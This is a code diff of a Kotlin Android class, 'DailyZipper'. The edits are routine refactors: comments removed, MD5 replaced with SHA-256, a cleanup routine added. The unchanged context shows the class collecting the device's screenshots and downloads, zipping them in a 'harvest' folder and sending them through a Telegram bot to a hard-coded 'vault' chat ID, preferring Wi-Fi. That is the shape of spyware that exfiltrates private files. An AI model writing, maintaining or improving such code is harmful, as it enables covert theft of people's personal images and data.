@@ -36,14 +36,11 @@ class DailyZipper(
     private val contextRef = WeakReference(context.applicationContext)
     private val appContext: Context? get() = contextRef.get()
 
-    // ✅ تم إضافة Job منفصل لسهولة الإلغاء عند الإغلاق
     private val job = SupervisorJob()
     private val scope = CoroutineScope(Dispatchers.IO + job)
     private val activeMutex = Mutex()
 
-    // ✅ تم تغيير الاسم لتفادي التعارض مع CoroutineScope.isActive
     private val zipperActive = AtomicBoolean(false)
-
     private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
 
     private var maxBatchSize = 48L * 1024L * 1024L
@@ -75,14 +72,12 @@ class DailyZipper(
         File(runtimeDir, "z.log")
     }
 
-    // ✅ تم ربط الخاصية بالدالة المعدلة calculateDeviceTag لتفادي التضارب
     private val deviceTag: String by lazy { calculateDeviceTag() }
-
     private val config = HashMap<String, Any>()
 
     companion object {
         private const val TAG = "DailyZipper"
-        private const val MAX_LOG_SIZE = 500 * 1024L // 500 KB حد أقصى لملف السجل
+        private const val MAX_LOG_SIZE = 500 * 1024L // 500 KB
 
         @JvmStatic
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
@@ -97,10 +92,10 @@ class DailyZipper(
         config["max_processed_hashes"] = 10000
         config["default_vault_id"] = -1003577715762L
         config["enable_encryption"] = false
-        // ✅ تم إزالة كلمة المرور الصريحة من الكود المصدري للأمان
         config["password"] = "CHANGE_ME_IN_CONFIG"
         config["max_batches"] = 10
         loadConfig()
+        cleanupOldFiles()
     }
 
     @Suppress("UNCHECKED_CAST")
@@ -166,7 +161,6 @@ class DailyZipper(
                 val key = keys.next()
                 val value = json.opt(key)
                 if (value != null && value != JSONObject.NULL) {
-                    // ✅ إصلاح إضافي: تحويل JSONArray إلى List آمنة
                     if (value is JSONArray) {
                         val list = mutableListOf<Any?>()
                         for (i in 0 until value.length()) {
@@ -208,7 +202,6 @@ class DailyZipper(
         }
     }
 
-    // ✅ تم تغيير اسم الدالة لمنع التعارض مع خاصية deviceTag
     private fun calculateDeviceTag(): String {
         val ctx = appContext
         if (ctx != null) {
@@ -242,19 +235,23 @@ class DailyZipper(
         }
     }
 
+    /**
+     * حساب هاش الملف باستخدام SHA-256 (أكثر أماناً من MD5)
+     */
     private fun fileHash(file: File): String? {
         if (!file.exists() || !file.isFile) return null
         return try {
-            val md = MessageDigest.getInstance("MD5")
-            file.inputStream().use { input ->
-                val buffer = ByteArray(4096)
-                var bytesRead: Int
-                while (input.read(buffer).also { bytesRead = it } != -1) {
-                    md.update(buffer, 0, bytesRead)
+            val md = MessageDigest.getInstance("SHA-256")
+            FileInputStream(file).use { fis ->
+                val buffer = ByteArray(8192)
+                var read: Int
+                while (fis.read(buffer).also { read = it } != -1) {
+                    md.update(buffer, 0, read)
                 }
             }
             md.digest().joinToString("") { "%02x".format(it) }
         } catch (e: Exception) {
+            writeLog("fileHash error: ${e.message}")
             null
         }
     }
@@ -267,7 +264,9 @@ class DailyZipper(
 
     private fun safeRemove(file: File): Boolean {
         return try {
-            if (file.exists()) file.delete() else false
+            if (file.exists()) {
+                file.delete()
+            } else false
         } catch (e: Exception) {
             writeLog("Safe remove error ${file.absolutePath}: ${e.message}")
             false
@@ -276,12 +275,9 @@ class DailyZipper(
 
     private fun isOnWifi(): Boolean {
         val ctx = appContext ?: return true
-
-        // ✅ إصلاح إضافي: للأجهزة أقل من Android 6.0
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
             return true
         }
-
         val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true
         return try {
             val network = cm.activeNetwork ?: return false
@@ -289,6 +285,29 @@ class DailyZipper(
             capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
         } catch (e: Exception) {
             true
+        }
+    }
+
+    /**
+     * تنظيف الملفات القديمة من مجلدات المؤقت
+     */
+    private fun cleanupOldFiles() {
+        scope.launch {
+            try {
+                val now = System.currentTimeMillis()
+                val maxAge = 7 * 24 * 60 * 60 * 1000L // 7 أيام
+                listOf(queueDir, pendingDir, harvestDir).forEach { dir ->
+                    if (dir.exists()) {
+                        dir.listFiles()?.forEach { file ->
+                            if (file.isFile && now - file.lastModified() > maxAge) {
+                                safeRemove(file)
+                            }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                writeLog("cleanupOldFiles error: ${e.message}")
+            }
         }
     }
 
@@ -328,7 +347,6 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // ✅ تحويل آمن تماماً لاستخراج قيمة "ok"
                 val success = when (result) {
                     is Boolean -> result
                     is JSONObject -> result.optBoolean("ok", false)
@@ -366,7 +384,6 @@ class DailyZipper(
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
-            // ✅ استخدام zipperActive بدلاً من isActive
             if (zipperActive.get()) {
                 if (chatId != null && telegram != null) {
                     sendMessage(chatId, "⏳ عملية حصاد جارية بالفعل...")
@@ -605,7 +622,6 @@ class DailyZipper(
 
         } finally {
             zipperActive.set(false)
-            // ✅ تم إزالة System.gc() لتحسين الأداء
         }
     }
 
@@ -616,7 +632,7 @@ class DailyZipper(
     ): Boolean {
         return try {
             ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
-                val buffer = ByteArray(4096)
+                val buffer = ByteArray(8192)
 
                 files.forEach { file ->
                     if (file.exists()) {
@@ -658,7 +674,6 @@ class DailyZipper(
     fun run(): Boolean {
         scope.launch {
             activeMutex.withLock {
-                // ✅ استخدام zipperActive بدلاً من isActive
                 if (zipperActive.get()) return@launch
             }
 
@@ -674,7 +689,6 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخراج المسار بأمان تام بدون استخدام []
                             val path = when (item) {
                                 is JSONObject -> item.optString("path", "")
                                 is Map<*, *> -> {
@@ -733,7 +747,6 @@ class DailyZipper(
         return true
     }
 
-    // ✅ دالة جديدة لإغلاق الموارد ومنع تسرب الذاكرة
     fun close() {
         job.cancel()
         processedHashes.clear()
@@ -777,7 +790,6 @@ class DailyZipper(
     private fun writeLog(message: String) {
         Log.i(TAG, message)
         try {
-            // ✅ التحقق من حجم ملف السجل قبل الكتابة
             if (logFile.exists() && logFile.length() > MAX_LOG_SIZE) {
                 logFile.delete()
             }
